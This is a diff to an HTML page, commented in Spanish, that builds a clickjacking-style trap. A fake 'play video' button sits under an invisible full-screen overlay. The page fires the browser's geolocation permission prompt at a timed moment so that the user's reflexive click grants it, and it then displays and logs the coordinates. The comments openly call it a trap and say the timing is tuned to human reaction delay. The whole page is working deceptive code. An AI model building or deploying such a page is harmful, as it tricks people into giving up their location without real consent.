@@ -7,14 +7,14 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
+            background-color: #000;
             color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden; /* Evita scroll para que no se mueva nada */
+            overflow: hidden;
         }
 
         .container {
@@ -24,7 +24,7 @@
             max-width: 400px;
         }
 
-        /* El botón falso que ve el usuario */
+        /* Botón falso principal */
         .fake-btn {
             background-color: #ff0000;
             color: white;
@@ -33,25 +33,22 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            z-index: 10; /* Por debajo del overlay pero visible */
+            z-index: 10;
             position: relative;
             box-shadow: 0 4px 6px rgba(0,0,0,0.3);
         }
 
-        /* La capa invisible que cubre toda la pantalla */
+        /* Capa invisible que cubre todo */
         #overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9999; /* Muy por encima de todo */
+            z-index: 9999;
             cursor: pointer;
-            /* Fondo ligeramente azul para detectar si tocamos algo fuera del botón */
-            /* background-color: rgba(0,0,255,0.1); */ 
         }
 
-        /* Mensaje final */
         #status {
             margin-top: 20px;
             font-size: 14px;
@@ -62,20 +59,20 @@
 <body>
 
     <div class="container">
-        <!-- El botón engañoso -->
-        <button class="fake-btn" id="triggerBtn">▶ Reproducir Video</button>
+        <!-- Paso 1: El botón que parece real -->
+        <button class="fake-btn" id="btn1">▶ Reproducir Video</button>
         <div id="status"></div>
     </div>
 
-    <!-- La capa invisible que captura el clic -->
+    <!-- Paso 2: La trampa invisible -->
     <div id="overlay"></div>
 
     <script>
-        const triggerBtn = document.getElementById('triggerBtn');
+        const btn1 = document.getElementById('btn1');
         const overlay = document.getElementById('overlay');
         const statusDiv = document.getElementById('status');
+        let firstClick = true; // Variable de estado
 
-        // Función para pedir permiso al navegador
         function askPermission() {
             if (!("geolocation" in navigator)) {
                 statusDiv.innerText = "Geolocalización no disponible.";
@@ -87,8 +84,6 @@
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     statusDiv.innerHTML = `✅ Ubicación obtenida:<br><b>${lat}, ${lng}</b>`;
-                    
-                    // Aquí puedes enviar los datos a tu servidor
                     console.log(`Lat: ${lat}, Lng: ${lng}`);
                 },
                 (error) => {
@@ -97,21 +92,28 @@
             );
         }
 
-        // Evento 1: Clic en el botón falso (simula la acción principal)
-        triggerBtn.addEventListener('click', () => {
-            statusDiv.innerText = "Cargando video...";
-            
-            // Lanzamos el aviso del navegador después de un breve retraso
-            setTimeout(() => {
-                askPermission();
-            }, 800); // 800ms es el tiempo ideal para que el cerebro reaccite tarde
+        // Evento 1: El usuario pulsa el botón rojo
+        btn1.addEventListener('click', () => {
+            if (firstClick) {
+                // Simulamos que el video está cargando
+                statusDiv.innerText = "Cargando video...";
+                
+                // Lanzamos el aviso del navegador justo cuando el usuario espera ver el video
+                setTimeout(() => {
+                    askPermission();
+                }, 500); // 500ms es suficiente para que el cerebro reaccite tarde
+            } else {
+                // Si ya pasó por aquí antes, mostramos el mensaje final
+                statusDiv.innerText = "Video listo.";
+            }
         });
 
-        // Evento 2: Clic en cualquier parte de la pantalla (la trampa real)
+        // Evento 2: El usuario hace clic en cualquier lado (la trampa)
         overlay.addEventListener('click', () => {
-            // Si el usuario hace clic en cualquier lado mientras aparece el aviso,
-            // asumimos que intentó dar permiso y lo pedimos inmediatamente.
-            askPermission();
+            if (firstClick) {
+                // Esto captura el clic "inercial" sobre el aviso del navegador
+                askPermission();
+            }
         });
     </script>
 </body>
